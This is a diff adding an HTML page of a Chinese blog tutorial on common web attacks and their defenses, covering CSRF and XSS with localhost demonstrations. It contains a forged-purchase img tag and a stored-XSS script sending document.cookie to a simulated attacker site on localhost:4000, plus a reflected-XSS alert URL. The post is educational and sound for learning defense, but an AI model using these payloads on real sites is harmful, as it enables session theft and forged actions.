@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        常见web攻击手段及防御措施 |
+        
+        Single-Minded&#39;s Blog
+    </title>
+    <link rel="shortcut icon" href="/single-minded/images/logo.svg">
+    
+<link rel="stylesheet" href="/single-minded/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"agangxuezhang.cn","root":"/single-minded/"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"../images/bg.jpg","description":"她呀，脸爱红。"}},"local_search":{"enable":false,"trigger":"auto","unescape":false,"preload":false},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            Single-Minded&#39;s Blog
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/single-minded/single-minded"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/single-minded/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/single-minded/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/single-minded/tags"
+                    >
+                        TAGS
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/single-minded/single-minded">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/single-minded/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/single-minded/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/single-minded/tags">TAGS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="empty-page-container">
+
+        
+
+        <div class="empty-page-content markdown-body">
+            
+                <h1 id="常见-web-攻击及防御措施"><a href="#常见-web-攻击及防御措施" class="headerlink" title="常见 web 攻击及防御措施"></a>常见 web 攻击及防御措施</h1><h2 id="一、常见-web-攻击种类"><a href="#一、常见-web-攻击种类" class="headerlink" title="一、常见 web 攻击种类"></a>一、常见 web 攻击种类</h2><ul>
+<li><p>CSRF 攻击</p>
+</li>
+<li><p>XSS 攻击</p>
+</li>
+<li><p>iframe 攻击</p>
+</li>
+<li><p>点击劫持</p>
+</li>
+<li><p>SQL 注入</p>
+</li>
+<li><p>OS 注入</p>
+</li>
+<li><p>请求劫持</p>
+</li>
+<li><p>DDOS</p>
+</li>
+</ul>
+<h2 id="二、如何攻击？怎么防范？"><a href="#二、如何攻击？怎么防范？" class="headerlink" title="二、如何攻击？怎么防范？"></a>二、如何攻击？怎么防范？</h2><h3 id="1-CSRF-攻击：跨站请求伪造"><a href="#1-CSRF-攻击：跨站请求伪造" class="headerlink" title="1. CSRF 攻击：跨站请求伪造"></a>1. CSRF 攻击：跨站请求伪造</h3><blockquote>
+<p> 跨站请求伪造 CSRF (Cross-site request forgery)，是一种挟制用户在当前已登录的 Web 应用程序上执行非本意操作的攻击方法。</p>
+</blockquote>
+<p>​    它利用用户已经登录的身份信息，在用户无感的情况下，以用户的名义完成操作。</p>
+<h3 id="1-1-攻击流程"><a href="#1-1-攻击流程" class="headerlink" title="1.1 攻击流程"></a>1.1 攻击流程</h3><p>​    一次 CSRF 攻击发生的过程可能是这样：</p>
+<img src="/Users/wegin/Library/Application Support/typora-user-images/image-20201229143213105.png" alt="image-20201229143213105" style="zoom:50%;" />
+
+<p>​        我们来简述一下图示流程：</p>
+<p>​            A. 用户 A 登录购物网站 <a class="link"   target="_blank" rel="noopener" href="http://www.example.shop,并获取到/" >http://www.example.shop，并获取到<i class="fas fa-external-link-alt"></i></a> cookie。</p>
+<p>​            B. 攻击者事先知道该购物网站完成一次购物操作的URL，因此事先将脚本注入页面</p>
+<p>​                （例如：&lt;img src=”<a class="link"   target="_blank" rel="noopener" href="http://www.example.shop/buy?productId=00010&amp;count=10&amp;address=exam" >http://www.example.shop/buy?productId=00010&amp;count=10&amp;address=exam<i class="fas fa-external-link-alt"></i></a>                    ple”&gt;）</p>
+<p>​            C. 在用户 A 没有登出购物网站（即cookie未失效）的情况下，访问了攻击者网站。</p>
+<p>​                此时攻击者网站会返回具有恶意脚本的页面，伪造用户发送请求到服务器。</p>
+<p>​            由此可知，攻击关键就是欺骗用户浏览器，让其以用户的名义发出请求，进行操作。</p>
+<h3 id="1-2-攻击演练"><a href="#1-2-攻击演练" class="headerlink" title="1.2 攻击演练"></a>1.2 攻击演练</h3><p>下面我会通过开启两个服务， <a class="link"   target="_blank" rel="noopener" href="http://localhost:3000/%E6%A8%A1%E6%8B%9F%E8%B4%AD%E7%89%A9%E7%BD%91%E7%AB%99%EF%BC%8Chttp://localhost:4000/%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E7%BD%91%E7%AB%99" >http://localhost:3000/模拟购物网站，http://localhost:4000/模拟黑客网站<i class="fas fa-external-link-alt"></i></a></p>
+<p>A. 模拟用户登录购物网站，获取 cookie 信息<img src="/Users/wegin/文档/Blog/安全/CSRF - 模拟用户登录.png" alt="CSRF - 购物网站" style="zoom:50%;" /></p>
+<p>B. 模拟用户访问黑客网站，黑客网站中事先注入了攻击脚本：</p>
+<img src="/Users/wegin/文档/Blog/安全/CSRF - 黑客网站.png" alt="CSRF - 黑客网站" style="zoom:50%;" />
+
+<p>​    刷新购物网站，发现被攻击了：</p>
+<p>​                                      <img src="/Users/wegin/文档/Blog/安全/CSRF - 被攻击现象查看.png" alt="CSRF - 被攻击现象查看" style="zoom:50%;" />  </p>
+<h3 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h3><p>利用用户登录态，用户不知情情况下进行操作：</p>
+<ul>
+<li>可盗取用户资金，进行转账消费等操作</li>
+<li>可冒充用户发帖、进行恶意言论等</li>
+</ul>
+<h3 id="1-4-防御措施"><a href="#1-4-防御措施" class="headerlink" title="1.4 防御措施"></a>1.4 防御措施</h3><ul>
+<li><p>设置 Referer 字段</p>
+<p>Referer 请求头标识当前请求是从哪个页面发送过来的，服务端可根据该地址判断出是否是恶意请求。</p>
+<p>局限性：完全依赖于浏览器发送正确的 Referer 字段，我们无法保证浏览器内部对 Referer 的实现。</p>
+</li>
+<li><p>通过手机验证码或token进行校验</p>
+<h3 id="2-XSS-攻击：跨站脚本攻击"><a href="#2-XSS-攻击：跨站脚本攻击" class="headerlink" title="2. XSS 攻击：跨站脚本攻击"></a>2. XSS 攻击：跨站脚本攻击</h3><blockquote>
+<p>跨站脚本攻击 XSS (Cross Site Scripting)，因为和层叠样式 CSS相同，所有简称为 XSS，是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
+</blockquote>
+<h3 id="2-1-攻击类型"><a href="#2-1-攻击类型" class="headerlink" title="2.1 攻击类型"></a>2.1 攻击类型</h3><p>XSS 攻击又可分为：</p>
+<ul>
+<li><p>持久型</p>
+<p>存储型：恶意脚本被存储到数据库中，当用户访问注入了恶意脚本的页面时，就会执行恶意代码。</p>
+<p>存储型一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+</li>
+<li><p>非持久型</p>
+<p>反射型：一般是攻击者通过特定方法，诱导用户访问恶意代码 URL，通过 URL 参数注入恶意代码。</p>
+<p>DOM 跨站（DOM XSS）：</p>
+</li>
+</ul>
+<h3 id="2-2-攻击演练"><a href="#2-2-攻击演练" class="headerlink" title="2.2 攻击演练"></a>2.2 攻击演练</h3><p>1、存储型攻击演练</p>
+<p>​    A. 黑客登录某论坛，在评论时注入恶意脚本，点击发布：</p>
+<p>​    <img src="/Users/wegin/文档/Blog/安全/XSS - 存储型注入.png" alt="image-20201229230935168" style="zoom:50%;" /></p>
+<p>注入脚本代码可以是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src=<span class="string">&#x27;http://localhost:4000/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+<p>B. 当其他用户登录并访问该评论列表时，恶意脚本被执行，黑客便能够拿到用户信息，例如上述黑客注入的代码中能够获取到用户的 cookie 信息</p>
+<p>![image-20201229231717247](/Users/wegin/文档/Blog/安全/XSS - 存储型获取到用户cookie.png)</p>
+</li>
+</ul>
+<p>2、反射型攻击演练</p>
+<p>​    A. 攻击者通过诱导用户点击恶意 URL， URL可能是这样：</p>
+<p>​        <code>http://localhost:3000/?from=&lt;script&gt;alert(&#39;我是一段恶意攻击脚本！&#39;)&lt;/script&gt;</code></p>
+<p>​    B.服务器接收到参数，将恶意代码取出拼接在用户 HTML 中，用户浏览器接收后进行执行，其中恶意代码        也被执行了。 </p>
+<img src="/Users/wegin/文档/Blog/安全/XSS - 反射型攻击 - 参数注入.png" alt="image-20201229233005958" style="zoom:50%;" />
+
+<p>3、DOM XSS 演练    </p>
+<h3 id="2-3-危害"><a href="#2-3-危害" class="headerlink" title="2.3 危害"></a>2.3 危害</h3><blockquote>
+<p>1、盗用<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/cookie/1119" >cookie<i class="fas fa-external-link-alt"></i></a>，获取敏感信息。</p>
+<p>2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java/85979" >Java<i class="fas fa-external-link-alt"></i></a>等得到类似的操作。</p>
+<p>3、利用<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/iframe/4446518" >iframe<i class="fas fa-external-link-alt"></i></a>、frame、<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/XMLHttpRequest/6788735" >XMLHttpRequest<i class="fas fa-external-link-alt"></i></a>或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
+<p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
+</blockquote>
+<h3 id="2-4-防御措施"><a href="#2-4-防御措施" class="headerlink" title="2.4 防御措施"></a>2.4 防御措施</h3><ol>
+<li>设置 X-XSS-Protection</li>
+<li>进行转义处理</li>
+<li>CSP</li>
+<li>开启 httpOnly</li>
+<li>采用成熟渲染框架，例如 react jsx，createElement方法已经做了 XSS 防范，会对字符进行转义处理</li>
+<li>进行验证码验证</li>
+<li>对不受信任的输入，限制一定的长度</li>
+</ol>
+
+            
+        </div>
+        <div class="empty-page-comments">
+            
+        </div>
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2020 <i class="fas fa-heart icon-animate"></i> <a href="/">无骛</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+
+
+
+</body>
+</html>
